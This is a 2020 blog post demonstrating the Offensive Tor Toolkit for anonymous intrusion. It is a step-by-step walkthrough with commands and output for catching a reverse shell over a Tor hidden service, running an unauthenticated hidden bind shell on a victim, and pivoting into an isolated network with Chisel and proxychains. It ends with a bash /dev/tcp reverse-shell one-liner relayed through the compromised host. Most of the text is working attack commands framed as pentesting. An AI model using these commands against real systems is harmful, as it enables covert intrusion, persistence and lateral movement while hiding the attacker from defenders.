---
title: Offensive Tor Toolkit PoC
type: posts
date: 2020-11-18
---
In this post we will be showing how to use [**Offensive Tor Toolkit**](https://github.com/atorrescogollo/offensive-tor-toolkit) for pentesting over Tor. This suite of tools will allow us to execute exploitation and post-exploitation tasks from the victim preserving the attacker anonymity. For more info, check the [**docs**](../../projects/offensive-tor-toolkit).

First of all, we have the following vulnerable scenario:
* **Victim1** serves a vulnerable service to Internet.
* **Victim2** serves a vulnerable service to the internal network and it has no access to Internet.

<span class="img-medium">![Overview](../static/offensive-tor-toolkit/01_Overview.png)</span>

</br>

## Gaining access with reverse-shell-over-tor
We assume that **we are able to execute commands in Victim1** in some way. Then, to obtain a reverse shell preserving anonymity, we will use [**reverse-shell-over-tor**](../../projects/offensive-tor-toolkit/reverse-shell-over-tor) from [**Offensive Tor Toolkit**](https://github.com/atorrescogollo/offensive-tor-toolkit) as follows:
* **Attacker**: run the handler reachable from a Hidden Service.
```bash
[attacker]$ grep '^HiddenService' /etc/tor/torrc
HiddenServiceDir /tmp/tortest
HiddenServicePort 4444 127.0.0.1:4444

[attacker]$ cat /tmp/tortest/hostname
m5et..jyd.onion

[attacker]$ nc -lvnp 4444
```
* **Victim1**: download and execute [**reverse-shell-over-tor**](../../projects/offensive-tor-toolkit/reverse-shell-over-tor).
```bash
[victim1]$ ./reverse-shell-over-tor \
    -listener m5et..jyd.onion:4444
```
* **Attacker**: reverse shell is catched with the handler.
```bash
[attacker]$ nc -lvnp 1234
...
id
uid=48(apache) gid=48(apache) groups=48(apache)
```
<span class="img-medium">![Reverse Shell over Tor](../static/offensive-tor-toolkit/02_reverse-shell-over-tor.png)</span>

</br>

## Multi-shell access with bind shell
In order to get a bind shell served by **Victim1**, we will use [**hidden-bind-shell**](../../projects/offensive-tor-toolkit/hidden-bind-shell) as follows:
* **Victim1**: download and execute [**hidden-bind-shell**](../../projects/offensive-tor-toolkit/hidden-bind-shell).
```bash
[victim1]$ ./hidden-bind-shell \
    -data-dir /tmp/datadir/ \
    -hiddensrvport 1234
...
Bind shell is listening on hgnzi6j3rqog6yew.onion:1234
```
* **Attacker**: connect to the Hidden Service to get a shell session.
```bash
[attacker]$ alias nctor='nc --proxy 127.0.0.1:9050 --proxy-type socks5'
[attacker]$ nctor -v hgnzi6j3rqog6yew.onion 1234
...
id
uid=48(apache) gid=48(apache) groups=48(apache)
```
> It should be noted that `data-dir` flag will allow us to start the service always in the same onion address.

> Currently, this bind shell has no authentication. This means that this bind shell for persistent purposes can be dangerous.

<span class="img-medium">![Hidden Bind Shell](../static/offensive-tor-toolkit/03_hidden-bind-shell.png)</span>

</br>

## Pivoting with hidden-portforwarding and Chisel
At this point, **Victim1** is already compromised. In order to reach **Victim2 (the isolated network machine)**, we will use **Victim1**.
To achieve our goal, we will use [**hidden-portforwarding**](../../projects/offensive-tor-toolkit/hidden-portforwarding) together with [**Chisel**](https://github.com/jpillora/chisel).

With this approach, we will set up a **Hidden Service in Victim1 that redirects to the Chisel server**. Thus, from the attacker we can generate a tunnel with the Chisel client on which to send traffic.

>Chisel client allows the attacker to generate a tunnel to the Chisel server.

* **Victim1**: Run the Chisel Server to listen on `127.0.0.1:1111` and [**hidden-portforwarding**](../../projects/offensive-tor-toolkit/hidden-portforwarding).
```bash
[victim1]$ ./chisel server -p 1111 --socks5 &
[victim1]$ ./hidden-portforwarding \
    -data-dir /tmp/pf-datadir \
    -forward 127.0.0.1:1111 \
    -hidden-port 9001
...
Forwarding xa7ljkruk7lra4el.onion:9001 -> 127.0.0.1:1111
```

* **Attacker**: Connect Chisel client to the Chisel server through the Hidden Service.
```bash
[attacker]$ alias chisel-client-tor='chisel client --proxy socks://127.0.0.1:9050'
[attacker]$ chisel-client-tor xa7ljkruk7lra4el.onion:9001 socks &
```

```bash
[attacker]$ ss -lntp | grep chisel
LISTEN 0   4096   127.0.0.1:1080   0.0.0.0:*  users:(("chisel",pid=3730,fd=3))
```

Now, Chisel client is listening as a **SOCKS5 proxy** so that traffic sent through the proxy goes out through **Victim1**. All you need to reach **Victim2** is to connect to this proxy as follows:
```bash
[attacker]$ alias pc4='proxychains4 -f /etc/proxychains4.conf'
[attacker]$ cat /etc/proxychains4.conf
...
[ProxyList]
socks5  127.0.0.1 1080

[attacker]$ pc4 nmap -sT -Pn -n -sV -sC -p80,22,25,3000 victim2
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
25/tcp   open  smtp    Postfix smtpd
80/tcp   open  http    Apache httpd 2.4.43 (() PHP/5.4.16)
3000/tcp open  http    Mongoose httpd
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.37 seconds
```

<span class="img-medium">![Hidden Portforwarding](../static/offensive-tor-toolkit/04_hidden-portforwarding.png)</span>

## Remote port forwarding through Tor
**Victim2** does not have Internet access, so we cannot access Tor directly from it. Alternatively, we can use [**tcp2tor-proxy**](../../projects/offensive-tor-toolkit/tcp2tor-proxy) to have **Victim1** used as a Tor proxy for **Victim2**.

* **Victim1**: Set up the remote port forwarding so that `127.0.0.1:60101` will reach the Hidden Service.
```bash
[victim1]$ ./tcp2tor-proxy -listen 0.0.0.0:60101 -onion-forward m5et..jyd.onion:4444
...
Proxying 0.0.0.0:60101 -> m5et..jyd.onion:4444
```

* **Attacker**: Set up a handler to received reverse shells.
```bash
[attacker]$ nc -lnvp 1234
```

* **Victim2**: Send the reverse shell to **Victim1** (tcp2tor-proxy).
```bash
[victim2]$ bash -i >& /dev/tcp/victim1/60101 0>&1
```

* **Attacker**: Receive the reverse shell
```bash
[attacker]$ nc -lnvp 1234
...
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

<span class="img-medium">![Tcp2Tor Proxy](../static/offensive-tor-toolkit/05_tcp2tor-proxy.png)</span>
